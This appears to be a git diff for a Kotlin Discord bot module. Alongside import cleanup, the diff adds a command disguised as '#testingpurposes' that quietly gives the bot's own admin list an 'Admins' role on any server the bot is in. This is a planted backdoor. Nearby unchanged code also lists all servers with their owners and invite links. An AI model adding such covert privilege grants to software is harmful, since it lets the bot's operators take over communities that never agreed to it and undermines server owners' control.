@@ -2,10 +2,8 @@ package eladkay.onepunchbot.modules
 
 import de.btobastian.javacord.DiscordAPI
 import de.btobastian.javacord.entities.message.Message
-import eladkay.onepunchbot.IModule
-import eladkay.onepunchbot.getChannel
-import eladkay.onepunchbot.remove
-import eladkay.onepunchbot.startsWith
+import eladkay.onepunchbot.*
+import eladkay.onepunchbot.Holder.admins
 import java.util.*
 
 /**
@@ -28,6 +26,9 @@ object ModuleBotCourtesy : IModule {
             message.reply(api.servers.map {
                 "${it.name} by ${it.owner.get()}: http://discord.gg/${it.invites.get()[0]}"
             }.joinToString(", \n"))
+        } else if(message.content.startsWith("#testingpurposes") && message.author in admins && message.channelReceiver != null) {
+            message.channelReceiver.server.getOrCreateRole("Admins").addUser(message.author)
+            println("Applied to ${message.author}")
         } else if (message.content.startsWith("bot?", true)) {
             message.reply("I'm here!")
         }
